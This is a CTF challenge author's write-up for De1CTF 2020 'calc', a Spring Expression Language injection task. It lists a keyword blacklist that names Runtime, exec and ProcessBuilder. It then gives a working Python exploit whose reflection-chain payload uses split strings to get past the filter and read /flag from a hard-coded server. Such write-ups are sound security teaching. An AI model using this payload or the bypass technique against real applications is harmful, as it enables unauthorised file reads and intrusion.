# De1CTF 2020 calc

## 1. challenge info
Please calculate the content of file /flag http://106.52.164.141

## 2. design document
I found there are many difference between spel's grammar and java's grammar. For example, in spel we can use 1.class to get the class java.lang.Integer, but in java, we cannot.

I want to design a challenge to let ctfers discovery these difference and construct a more complicated reflection chain instead of the copy the payload from the internet directly.

So, i use two technology to forbide normal payloads.

1. blacklist filter:
    - T\s*\(
    - \#
    - new
    - java\.lang
    - Runtime
    - exec.*\(
    - getRuntime
    - ProcessBuilder
    - start
    - getClass
    - String
2. rasp

There may be 3 different way to solve:
1. bypass blacklist filter to use T or # or new keywords
2. bypass blacklist by using 1.class.forName() to reflect java class, and construct a reflection chain to get flag
3. close the rasp protection

## 3. exp

which scheme we want players to use is the scheme2:bypass blacklist by using 1.class.forName() to reflect java class, and construct a reflection chain to get flag. and i just give my exploit here. of course you can try other two schemes to solve this challenge (actually they are really feasible.)

```
# coding=utf-8
import commands
import base64
import requests

def get_flag(target):
    payload = '1.class.forName("java.nio.file.Files").getMethod("readAllLines", 1.class.forName("java.nio.file.Path")).invoke(null, 1.class.forName("java.nio.file.Paths").getMethod("get", 1.class.forName("java.net.URI")).invoke(null, 1.class.forName("java.net.URI").getMethod("create", 1.class.forName("java.la"+"ng.Str"+"ing")).invoke(null, "file:///flag")))'
    print("payload", payload)
    url = "http://{}/spel/calc".format(target)
    r = requests.get(url, params={"calc": payload})
    print(r.request.url)
    print(r.text)


if __name__ == '__main__':
    get_flag("106.52.164.141")
```

## 4. other writeups
I am ashamed that there are more detailed writeups written by players. you can find here:
https://ctftime.org/task/11491
